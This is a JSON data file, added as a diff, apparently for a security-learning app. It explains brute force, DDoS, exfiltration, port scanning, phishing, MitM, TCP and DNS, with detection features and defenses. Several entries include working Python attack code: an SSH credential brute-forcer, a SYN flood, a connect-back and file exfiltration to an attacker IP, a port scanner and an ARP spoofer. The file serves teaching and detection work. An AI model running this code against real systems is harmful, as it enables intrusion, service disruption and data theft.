@@ -1,0 +1,281 @@
+[
+  {
+    "id": "brute_force",
+    "category": "attack",
+    "name": "Brute Force",
+    "mascot": "battering_ram",
+    "danger": 3,
+    "color": "#ff6d00",
+    "levels": {
+      "1": {
+        "title": "What is it?",
+        "body": "A brute force attack systematically tries every possible password or key combination until it finds the right one. Think of someone trying every key on a keyring against your front door lock. In network security, this usually targets SSH, FTP, or web login pages. Automated tools can attempt thousands of credentials per minute, cycling through common passwords, dictionary words, and leaked credential databases. Providence's honeypots captured 183,933 brute force sessions across 3 regions in 56 days — 65% of all observed attacks."
+      },
+      "2": {
+        "title": "How it works",
+        "body": "The attacker establishes a TCP connection to the target's SSH port (22), completes the handshake, and sends authentication attempts. Each failed attempt generates a short-lived flow with distinctive features: low packet count (3-8 packets), minimal payload, and rapid inter-arrival times between connection attempts from the same source IP. Providence's LightGBM model detects brute force by looking at flow_duration (very short), packet_count_fwd vs packet_count_bwd (asymmetric), syn_count (high relative to total packets), and bytes_per_sec (low — credentials are small payloads).",
+        "features": ["flow_duration", "packet_count_fwd", "packet_count_bwd", "syn_count", "bytes_per_sec"]
+      },
+      "3": {
+        "title": "Defense",
+        "body": "Rate-limit authentication attempts (fail2ban, SSH MaxAuthTries). Use key-based authentication instead of passwords. Deploy a honeypot to absorb and study brute force traffic (exactly what Providence does). Monitor for distributed brute force — attackers spread attempts across many source IPs to evade per-IP rate limits. Providence detected 79% of brute force sources using SSH-2.0-Go client strings, indicating automated tooling rather than manual attempts.",
+        "providence_query": "brute_force"
+      },
+      "4": {
+        "title": "Example Code",
+        "body": "Below is a simplified Python example showing how a brute force attack works at the network level. This is what Providence's honeypots observe thousands of times per day. Understanding the mechanics is essential for building effective detection.",
+        "code": "import paramiko\nimport itertools\n\ndef brute_force_ssh(target_ip, port=22, usernames=None, passwords=None):\n    \"\"\"Simplified SSH brute force — for educational purposes only.\n    This is what Providence's Eye observes and classifies.\"\"\"\n    client = paramiko.SSHClient()\n    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n\n    for user, passwd in itertools.product(usernames, passwords):\n        try:\n            client.connect(target_ip, port=port,\n                           username=user, password=passwd,\n                           timeout=3, banner_timeout=3)\n            print(f'[+] SUCCESS: {user}:{passwd}')\n            return (user, passwd)\n        except paramiko.AuthenticationException:\n            # Each failure = one short flow in Providence's logs\n            # Features: low packet_count, short duration, small payload\n            continue\n        except Exception:\n            break\n    return None",
+        "code_lang": "python",
+        "detection_note": "Providence detects this pattern by: flow_duration < 2s, packet_count < 10, bytes_per_sec < 500, and repeated SYN connections from the same source IP within a short window."
+      }
+    },
+    "unlock": { "2": "classify_brute_force_5", "3": "mission_brute_force_1", "4": "complete_brute_force_lab" },
+    "resources": [
+      { "name": "MITRE ATT&CK: Brute Force (T1110)", "url": "https://attack.mitre.org/techniques/T1110/", "description": "The definitive taxonomy of brute force sub-techniques including password guessing, spraying, and credential stuffing with real-world procedure examples." },
+      { "name": "OWASP: Credential Stuffing", "url": "https://owasp.org/www-community/attacks/Credential_stuffing", "description": "How attackers use leaked credential databases to automate login attempts across multiple services. Includes prevention cheat sheet." },
+      { "name": "SANS: Detecting SSH Brute Force", "url": "https://www.sans.org/reading-room/whitepapers/detection/detecting-ssh-brute-force-attacks-36217", "description": "Research paper on network-level detection patterns for SSH brute force — the same flow features Providence's ML model uses." },
+      { "name": "Hack The Box: Brute Force Labs", "url": "https://www.hackthebox.com/blog/brute-force-attacks", "description": "Hands-on practice labs where you can safely attempt brute force attacks against intentionally vulnerable targets." }
+    ]
+  },
+  {
+    "id": "ddos",
+    "category": "attack",
+    "name": "DDoS",
+    "mascot": "swarm",
+    "danger": 5,
+    "color": "#ff1744",
+    "levels": {
+      "1": {
+        "title": "What is it?",
+        "body": "A Distributed Denial of Service attack floods a target with so much traffic that legitimate users can't get through. Imagine a thousand people trying to walk through a single doorway simultaneously — nobody gets in. DDoS attacks use botnets (networks of compromised computers) to generate traffic from many sources at once, making it hard to block by IP. They target bandwidth, server resources, or application logic. A single attack can generate hundreds of gigabits per second of traffic."
+      },
+      "2": {
+        "title": "How it works",
+        "body": "Common DDoS variants include SYN floods (sending millions of TCP SYN packets without completing the handshake, exhausting the server's connection table), UDP floods (overwhelming bandwidth with large UDP packets), and HTTP floods (sending legitimate-looking web requests at massive scale). Providence's Eye detects DDoS by analyzing packets_per_sec (extremely high), syn_count relative to ack_count (SYN flood signature), bytes_per_sec (bandwidth saturation), and flow_duration (many very short incomplete flows).",
+        "features": ["packets_per_sec", "syn_count", "ack_count", "bytes_per_sec", "flow_duration"]
+      },
+      "3": {
+        "title": "Defense",
+        "body": "DDoS mitigation operates at multiple layers: network-level (rate limiting, blackholing), infrastructure-level (CDN/WAF like CloudFlare or AWS Shield), and application-level (connection limits, CAPTCHA). Providence's tiered response engine automatically escalates: OBSERVE at low confidence, RECOMMEND for human review, ACT to auto-block source IPs via firewall rules. The key insight: DDoS is about volume, so the response must be automated — human reaction time is too slow.",
+        "providence_query": "dos"
+      },
+      "4": {
+        "title": "Example Code",
+        "body": "A simplified SYN flood demonstration using raw sockets. This shows why SYN floods are effective — each packet costs the attacker almost nothing but forces the server to allocate resources for a half-open connection.",
+        "code": "from scapy.all import IP, TCP, send, RandShort\n\ndef syn_flood_demo(target_ip, target_port=80, count=100):\n    \"\"\"Educational SYN flood — demonstrates the attack vector.\n    Each SYN forces the server to allocate a connection slot.\n    Without a completing ACK, these slots stay open until timeout.\"\"\"\n\n    for i in range(count):\n        # Randomize source port to simulate distributed attack\n        pkt = IP(dst=target_ip) / TCP(\n            sport=RandShort(),   # random source port\n            dport=target_port,\n            flags='S',           # SYN only — no handshake completion\n            seq=RandShort()\n        )\n        send(pkt, verbose=False)\n\n    # Result: server's SYN backlog fills up\n    # Legitimate connections get refused (ECONNREFUSED)\n    # Providence sees: packets_per_sec spike, syn/ack ratio >> 1",
+        "code_lang": "python",
+        "detection_note": "Providence flags SYN floods by: packets_per_sec > 1000, syn_count/ack_count ratio > 10, flow_duration < 0.1s, and many incomplete connections from diverse source ports."
+      }
+    },
+    "unlock": { "2": "classify_dos_5", "3": "mission_dos_1", "4": "complete_dos_lab" },
+    "resources": [
+      { "name": "MITRE ATT&CK: Network DoS (T1498)", "url": "https://attack.mitre.org/techniques/T1498/", "description": "Covers direct network floods, reflection amplification, and application-layer DoS with documented threat group usage." },
+      { "name": "OWASP: Denial of Service", "url": "https://owasp.org/www-community/attacks/Denial_of_Service", "description": "Application-layer DoS techniques and the OWASP testing guide for identifying DoS vulnerabilities in web applications." },
+      { "name": "NIST: DDoS Quick Guide", "url": "https://www.nist.gov/publications/ddos-quick-guide", "description": "Federal guidelines for DDoS preparedness, detection, and response. Covers SYN floods, UDP amplification, and mitigation strategies." },
+      { "name": "PortSwigger: HTTP Request Smuggling", "url": "https://portswigger.net/web-security/request-smuggling", "description": "Advanced application-layer attack that can be used for DoS. Interactive labs to practice detection and exploitation." }
+    ]
+  },
+  {
+    "id": "exfiltration",
+    "category": "attack",
+    "name": "Exfiltration",
+    "mascot": "briefcase",
+    "danger": 4,
+    "color": "#b388ff",
+    "levels": {
+      "1": {
+        "title": "What is it?",
+        "body": "Data exfiltration is the unauthorized transfer of data out of a network. It's the endgame of most sophisticated attacks — the attacker has already gained access and is now stealing what they came for. This could be credentials, source code, customer data, or cryptographic keys. In Providence's honeypot data, exfiltration sessions show attackers downloading tools, copying files, and establishing reverse shells to maintain persistent access."
+      },
+      "2": {
+        "title": "How it works",
+        "body": "After gaining access (often via brute force or exploiting a vulnerability), the attacker transfers data outbound. This creates distinctive flow patterns: high bytes_bwd (data flowing from server to attacker), longer flow_duration than brute force, larger payload_size_mean, and often encrypted channels (high payload_entropy_mean). Providence captured 6,204 exfiltration sessions — attackers downloading cryptominers, establishing reverse shells, and copying SSH keys.",
+        "features": ["bytes_bwd", "flow_duration", "payload_size_mean", "payload_entropy_mean", "total_bytes"]
+      },
+      "3": {
+        "title": "Defense",
+        "body": "Monitor outbound traffic volume and patterns — legitimate servers rarely send large data volumes to unknown IPs. Implement Data Loss Prevention (DLP) rules. Use network segmentation to limit what an attacker can access after initial compromise. Providence's Eye tracks bytes_bwd per flow and flags anomalous outbound transfers. The Citadel's response engine can auto-block the destination IP to cut the exfiltration channel.",
+        "providence_query": "exfiltration"
+      },
+      "4": {
+        "title": "Example Code",
+        "body": "A simplified reverse shell and file exfiltration example. This is the post-exploitation phase — the attacker already has access and is stealing data. Providence's Eye detects the anomalous outbound data patterns this creates.",
+        "code": "import socket, subprocess, os\n\ndef reverse_shell_demo(attacker_ip, attacker_port=4444):\n    \"\"\"Educational reverse shell — shows how attackers maintain access.\n    The victim connects OUTBOUND to the attacker, bypassing firewalls\n    that only block inbound connections.\"\"\"\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((attacker_ip, attacker_port))\n    # Attacker now has a shell on the victim\n    # Providence sees: long flow_duration, high bytes_bwd,\n    # interactive packet timing patterns\n\ndef exfiltrate_file(attacker_ip, filepath, port=8443):\n    \"\"\"Exfiltrate a file over an encrypted channel.\n    Mimics HTTPS to blend with normal traffic.\"\"\"\n    with open(filepath, 'rb') as f:\n        data = f.read()\n\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((attacker_ip, port))\n    s.sendall(data)  # Large outbound transfer\n    s.close()\n    # Providence detects: bytes_bwd >> bytes_fwd,\n    # payload_size_mean is large, unusual dest IP",
+        "code_lang": "python",
+        "detection_note": "Providence detects exfiltration by: bytes_bwd > 10x bytes_fwd, flow_duration > 30s, high payload_entropy_mean (encrypted data), and connections to IPs not in the baseline communication profile."
+      }
+    },
+    "unlock": { "2": "classify_exfiltration_5", "3": "mission_exfiltration_1", "4": "complete_exfiltration_lab" },
+    "resources": [
+      { "name": "MITRE ATT&CK: Exfiltration (TA0010)", "url": "https://attack.mitre.org/tactics/TA0010/", "description": "Complete taxonomy of exfiltration techniques — over C2 channels, alternative protocols, web services, and physical media." },
+      { "name": "SANS: Data Exfiltration Techniques", "url": "https://www.sans.org/reading-room/whitepapers/detection/data-exfiltration-techniques-37027", "description": "Research paper covering DNS tunneling, steganography, and encrypted channel exfiltration with network-level detection signatures." },
+      { "name": "NIST: Privacy Framework", "url": "https://www.nist.gov/privacy-framework", "description": "Federal framework for managing data privacy risk, including controls for detecting and preventing unauthorized data transfers." },
+      { "name": "Krebs: Data Breach Investigations", "url": "https://krebsonsecurity.com/category/data-breaches/", "description": "Investigative journalism on real-world data breaches — how attackers got in, what they stole, and how they exfiltrated it." }
+    ]
+  },
+  {
+    "id": "probe",
+    "category": "attack",
+    "name": "Probe / Port Scan",
+    "mascot": "scanner",
+    "danger": 2,
+    "color": "#ffd600",
+    "levels": {
+      "1": {
+        "title": "What is it?",
+        "body": "A probe or port scan is reconnaissance — the attacker is mapping your network to find open doors before attempting entry. They send packets to many ports on a target to see which ones respond, revealing running services. It's like a burglar checking every window and door of a house. Port scans are often the first sign of an incoming attack. Providence's honeypots recorded 92,726 probe sessions — the second most common attack type at 33% of all traffic."
+      },
+      "2": {
+        "title": "How it works",
+        "body": "The scanner sends SYN packets to sequential or random ports. Open ports respond with SYN-ACK, closed ports with RST. This creates many very short flows with high syn_count, zero payload, and minimal packet_count (1-2 packets per flow). Advanced scanners randomize port order and throttle speed to evade detection. Providence detects probes by their distinctive pattern: many flows from one source IP, each with packet_count=1, zero bytes_fwd, and rst_count > 0.",
+        "features": ["syn_count", "rst_count", "packet_count", "bytes_fwd", "flow_duration"]
+      },
+      "3": {
+        "title": "Defense",
+        "body": "Minimize your attack surface — close unnecessary ports, use firewalls to restrict access. Deploy honeypots on unused ports to detect and study scanners (Providence's approach). Rate-limit new connections from single IPs. The key insight: a port scan itself isn't harmful, but it's a reliable predictor of a follow-up attack. Providence's OBSERVE tier logs probes without blocking, building intelligence for when the real attack comes.",
+        "providence_query": "probe"
+      },
+      "4": {
+        "title": "Example Code",
+        "body": "A simplified TCP port scanner. This is the most common reconnaissance tool — nmap, masscan, and zmap all work on this principle. Understanding scanning helps you recognize it in your logs.",
+        "code": "import socket\nfrom concurrent.futures import ThreadPoolExecutor\n\ndef scan_port(target_ip, port, timeout=1):\n    \"\"\"Attempt a TCP connection to a single port.\n    Open port: completes handshake (SYN → SYN-ACK → ACK)\n    Closed port: receives RST\n    Filtered: timeout (firewall drops the SYN)\"\"\"\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.settimeout(timeout)\n        result = s.connect_ex((target_ip, port))\n        s.close()\n        return port if result == 0 else None\n    except:\n        return None\n\ndef port_scan(target_ip, ports=range(1, 1025)):\n    \"\"\"Scan common ports in parallel.\n    Each attempt = 1 flow in Providence's logs.\n    Pattern: many 1-2 packet flows from same source.\"\"\"\n    open_ports = []\n    with ThreadPoolExecutor(max_workers=100) as pool:\n        results = pool.map(\n            lambda p: scan_port(target_ip, p), ports\n        )\n        open_ports = [p for p in results if p]\n    return open_ports\n    # Providence sees: 1000+ flows, each with packet_count=1-2,\n    # zero payload, sequential or random dest_port values",
+        "code_lang": "python",
+        "detection_note": "Providence detects port scans by: 50+ flows from one source IP within 60s, packet_count ≤ 2 per flow, zero bytes_fwd payload, and high rst_count indicating closed ports responding."
+      }
+    },
+    "unlock": { "2": "classify_probe_5", "3": "mission_probe_1", "4": "complete_probe_lab" },
+    "resources": [
+      { "name": "MITRE ATT&CK: Network Service Scanning (T1046)", "url": "https://attack.mitre.org/techniques/T1046/", "description": "How threat groups use port scanning for reconnaissance, with documented procedures from APT groups and red team tools." },
+      { "name": "Shodan: Search Engine for IoT", "url": "https://www.shodan.io", "description": "See what internet-wide scanning looks like from the other side. Search for exposed services, default credentials, and vulnerable devices globally." },
+      { "name": "SANS: Port Scanning Techniques & Defense", "url": "https://www.sans.org/reading-room/whitepapers/auditing/port-scanning-techniques-defense-70", "description": "Comprehensive overview of SYN scans, FIN scans, XMAS scans, and idle scans with IDS evasion techniques and detection strategies." },
+      { "name": "Hack The Box: Reconnaissance Labs", "url": "https://www.hackthebox.com/blog/reconnaissance", "description": "Practice scanning and enumeration against real targets in a safe environment. Learn nmap, masscan, and service fingerprinting." }
+    ]
+  },
+  {
+    "id": "phishing",
+    "category": "attack",
+    "name": "Phishing",
+    "mascot": "hook",
+    "danger": 4,
+    "color": "#ff6d00",
+    "levels": {
+      "1": {
+        "title": "What is it?",
+        "body": "Phishing tricks people into revealing sensitive information by impersonating a trusted entity. The attacker sends an email, message, or creates a fake website that looks legitimate — your bank, your employer, a service you use. The goal is to harvest credentials, install malware, or trick you into transferring money. It's the most common initial attack vector in cybersecurity, responsible for over 80% of reported security incidents."
+      },
+      "2": {
+        "title": "How it works",
+        "body": "Phishing operates at the application layer, not the network layer — it exploits human psychology rather than technical vulnerabilities. Spear phishing targets specific individuals with personalized messages. Whaling targets executives. Clone phishing duplicates a legitimate email with malicious links. Providence's Ward browser extension detects phishing by analyzing URL patterns, domain age, SSL certificate validity, and page content similarity to known legitimate sites.",
+        "features": []
+      },
+      "3": {
+        "title": "Defense",
+        "body": "Multi-factor authentication (MFA) is the single most effective defense — even if credentials are phished, the attacker can't use them without the second factor. Email filtering, URL reputation checking, and user awareness training all help. Providence's Ward extension provides real-time browser-level protection, scoring every page visit and warning users before they interact with suspicious sites.",
+        "providence_query": "phishing"
+      },
+      "4": {
+        "title": "Example Code",
+        "body": "A simplified phishing page detector. This shows the signals Providence's Ward extension analyzes to score a page's legitimacy. Understanding these heuristics helps you spot phishing manually too.",
+        "code": "from urllib.parse import urlparse\nimport ssl, socket, whois\nfrom datetime import datetime, timedelta\n\ndef analyze_url(url):\n    \"\"\"Score a URL for phishing indicators.\n    Each check returns a risk score (0-1).\n    Providence's Ward runs these in real-time.\"\"\"\n    parsed = urlparse(url)\n    risk = 0.0\n\n    # 1. Domain age — phishing domains are usually < 30 days old\n    try:\n        w = whois.whois(parsed.hostname)\n        created = w.creation_date\n        if isinstance(created, list): created = created[0]\n        age_days = (datetime.now() - created).days\n        if age_days < 30:\n            risk += 0.4  # Very suspicious\n    except:\n        risk += 0.2  # Can't verify = suspicious\n\n    # 2. Subdomain depth — login.secure.bank.evil.com\n    subdomain_count = len(parsed.hostname.split('.')) - 2\n    if subdomain_count > 2:\n        risk += 0.2\n\n    # 3. Lookalike characters — g00gle.com, paypa1.com\n    lookalikes = {'0': 'o', '1': 'l', '5': 's'}\n    domain = parsed.hostname.split('.')[0]\n    if any(c in domain for c in lookalikes):\n        risk += 0.3\n\n    return min(risk, 1.0)",
+        "code_lang": "python",
+        "detection_note": "Ward scores pages using: domain age, SSL certificate validity, URL structure anomalies, visual similarity to known brands (perceptual hashing), and form action URLs pointing to different domains."
+      }
+    },
+    "unlock": { "2": "complete_phishing_quiz", "3": "mission_phishing_1", "4": "complete_phishing_lab" },
+    "resources": [
+      { "name": "MITRE ATT&CK: Phishing (T1566)", "url": "https://attack.mitre.org/techniques/T1566/", "description": "Sub-techniques covering spearphishing attachments, links, and service-based phishing with real APT group procedures." },
+      { "name": "OWASP: Phishing", "url": "https://owasp.org/www-community/attacks/Phishing", "description": "Overview of phishing attack vectors and the OWASP anti-phishing guidelines for application developers." },
+      { "name": "PortSwigger: Authentication Vulnerabilities", "url": "https://portswigger.net/web-security/authentication", "description": "Interactive labs on bypassing authentication — the systems phishing attacks target. Practice credential theft defenses." },
+      { "name": "VirusTotal: URL Scanner", "url": "https://www.virustotal.com/gui/home/url", "description": "Scan any suspicious URL against 70+ security engines. Essential tool for verifying phishing links before clicking." },
+      { "name": "Krebs: Phishing Investigations", "url": "https://krebsonsecurity.com/category/phishing/", "description": "Deep investigative reporting on real phishing campaigns — who's behind them, how they operate, and how they get caught." }
+    ]
+  },
+  {
+    "id": "mitm",
+    "category": "attack",
+    "name": "Man-in-the-Middle",
+    "mascot": "interceptor",
+    "danger": 4,
+    "color": "#2979ff",
+    "levels": {
+      "1": {
+        "title": "What is it?",
+        "body": "A Man-in-the-Middle (MitM) attack places the attacker between two parties who believe they're communicating directly. The attacker can eavesdrop on, modify, or inject messages into the conversation without either party knowing. Imagine someone secretly reading your mail, changing the contents, and resealing the envelope before delivery. MitM attacks target unencrypted connections, weak TLS implementations, and compromised network infrastructure."
+      },
+      "2": {
+        "title": "How it works",
+        "body": "The attacker positions themselves on the network path — via ARP spoofing (on local networks), DNS hijacking, or compromised routers. They then proxy traffic between the two parties, decrypting and re-encrypting if needed. Providence's Eye can detect MitM indicators through JA3 fingerprinting — if the TLS fingerprint of a connection doesn't match the expected client, it may indicate a proxy. Anomalous certificate chains and unexpected cipher suites are also red flags.",
+        "features": []
+      },
+      "3": {
+        "title": "Defense",
+        "body": "Use TLS everywhere (HTTPS). Implement certificate pinning for critical connections. Use VPNs on untrusted networks. HSTS (HTTP Strict Transport Security) prevents SSL stripping attacks. Providence's JA3 fingerprinting provides passive MitM detection by comparing observed TLS handshakes against known-good fingerprints for each client type.",
+        "providence_query": "mitm"
+      },
+      "4": {
+        "title": "Example Code",
+        "body": "A simplified ARP spoofing MitM attack. This is the most common local-network MitM technique — the attacker poisons the ARP cache to redirect traffic through their machine.",
+        "code": "from scapy.all import ARP, Ether, sendp, getmacbyip\nimport time\n\ndef arp_spoof_demo(target_ip, gateway_ip, interface='eth0'):\n    \"\"\"Educational ARP spoof — demonstrates MitM positioning.\n    Tells the target: 'I am the gateway'\n    Tells the gateway: 'I am the target'\n    All traffic now flows through the attacker.\"\"\"\n    target_mac = getmacbyip(target_ip)\n    gateway_mac = getmacbyip(gateway_ip)\n\n    # Poison target: \"gateway is at MY mac address\"\n    pkt_to_target = Ether(dst=target_mac) / ARP(\n        op='is-at',\n        psrc=gateway_ip,    # claim to be the gateway\n        pdst=target_ip,\n        hwdst=target_mac\n    )\n\n    # Poison gateway: \"target is at MY mac address\"\n    pkt_to_gateway = Ether(dst=gateway_mac) / ARP(\n        op='is-at',\n        psrc=target_ip,     # claim to be the target\n        pdst=gateway_ip,\n        hwdst=gateway_mac\n    )\n\n    # Must send continuously — ARP caches expire\n    while True:\n        sendp(pkt_to_target, iface=interface, verbose=False)\n        sendp(pkt_to_gateway, iface=interface, verbose=False)\n        time.sleep(2)\n    # Detection: duplicate ARP replies, MAC address changes,\n    # JA3 fingerprint mismatches in TLS connections",
+        "code_lang": "python",
+        "detection_note": "Providence detects MitM via JA3 fingerprint mismatches — if a connection's TLS handshake doesn't match the expected client fingerprint, a proxy is likely intercepting. Anomalous ARP traffic and unexpected certificate chains are also flagged."
+      }
+    },
+    "unlock": { "2": "complete_mitm_quiz", "3": "mission_mitm_1", "4": "complete_mitm_lab" },
+    "resources": [
+      { "name": "MITRE ATT&CK: Adversary-in-the-Middle (T1557)", "url": "https://attack.mitre.org/techniques/T1557/", "description": "ARP poisoning, LLMNR/NBT-NS spoofing, and DHCP spoofing techniques used by real threat groups to intercept network traffic." },
+      { "name": "OWASP: Manipulator-in-the-Middle", "url": "https://owasp.org/www-community/attacks/Manipulator-in-the-middle_attack", "description": "Application-layer MitM attacks including SSL stripping, session hijacking, and how to test for MitM vulnerabilities." },
+      { "name": "PortSwigger: Information Disclosure", "url": "https://portswigger.net/web-security/information-disclosure", "description": "How intercepted traffic leads to information disclosure. Interactive labs on exploiting and preventing data leakage." },
+      { "name": "CyberChef: Decode & Analyze", "url": "https://gchq.github.io/CyberChef", "description": "Analyze intercepted data — decode Base64, decrypt, decompress, and transform captured traffic to understand what was stolen." }
+    ]
+  },
+  {
+    "id": "tcp_handshake",
+    "category": "network",
+    "name": "TCP Handshake",
+    "mascot": "handshake",
+    "danger": 0,
+    "color": "#0A9396",
+    "levels": {
+      "1": {
+        "title": "What is it?",
+        "body": "The TCP three-way handshake is how two computers establish a reliable connection before exchanging data. It's like a phone call: you dial (SYN), the other person picks up and says hello (SYN-ACK), and you confirm you can hear them (ACK). Only after this exchange can data flow. Every SSH connection to Providence's honeypots starts with this handshake — it's the foundation of network communication."
+      },
+      "2": {
+        "title": "How it works",
+        "body": "Step 1: Client sends a SYN (synchronize) packet with a random sequence number. Step 2: Server responds with SYN-ACK — acknowledging the client's sequence and providing its own. Step 3: Client sends ACK, confirming the server's sequence. The connection is now ESTABLISHED. Providence's Eye tracks syn_count, ack_count, and fin_count per flow to understand connection lifecycle. A SYN without a completing ACK is a half-open connection — the signature of a SYN flood attack.",
+        "features": ["syn_count", "ack_count", "fin_count"]
+      },
+      "3": {
+        "title": "Security implications",
+        "body": "The handshake is exploitable: SYN floods send millions of SYNs without completing the handshake, exhausting the server's connection table. SYN cookies mitigate this by encoding state in the sequence number rather than allocating memory. RST (reset) packets can forcibly terminate connections — Providence tracks rst_count to detect connection disruption attacks. The ratio of SYN to ACK packets in a flow is one of the most powerful features for attack classification.",
+        "providence_query": "tcp"
+      }
+    },
+    "unlock": { "2": "complete_tcp_quiz", "3": "xp_500" }
+  },
+  {
+    "id": "dns",
+    "category": "network",
+    "name": "DNS Resolution",
+    "mascot": "resolver",
+    "danger": 0,
+    "color": "#0A9396",
+    "levels": {
+      "1": {
+        "title": "What is it?",
+        "body": "DNS (Domain Name System) translates human-readable domain names like 'google.com' into IP addresses like '142.250.80.46' that computers use to route traffic. It's the phone book of the internet. Every time you visit a website, your computer first asks a DNS server 'what's the IP for this domain?' before it can connect. Providence's Eye includes a DNS parser that captures and analyzes these queries in real-time."
+      },
+      "2": {
+        "title": "How it works",
+        "body": "Your computer sends a UDP query to a recursive DNS resolver (usually your ISP's or a public one like 8.8.8.8). The resolver checks its cache, then queries root servers → TLD servers → authoritative servers in a hierarchical lookup. The response contains the IP address and a TTL (time-to-live) for caching. Providence's Eye captures DNS queries on port 53 and extracts the queried domain, response IP, and query type (A, AAAA, MX, TXT).",
+        "features": []
+      },
+      "3": {
+        "title": "Security implications",
+        "body": "DNS is a major attack surface: DNS spoofing returns fake IP addresses to redirect traffic. DNS tunneling hides data exfiltration inside DNS queries. DNS amplification uses open resolvers to amplify DDoS traffic. DNSSEC adds cryptographic signatures to prevent spoofing. Providence monitors DNS query patterns — unusual query volumes, queries to known-malicious domains, and DNS-over-HTTPS bypasses are all indicators of compromise.",
+        "providence_query": "dns"
+      }
+    },
+    "unlock": { "2": "complete_dns_quiz", "3": "xp_500" }
+  }
+]
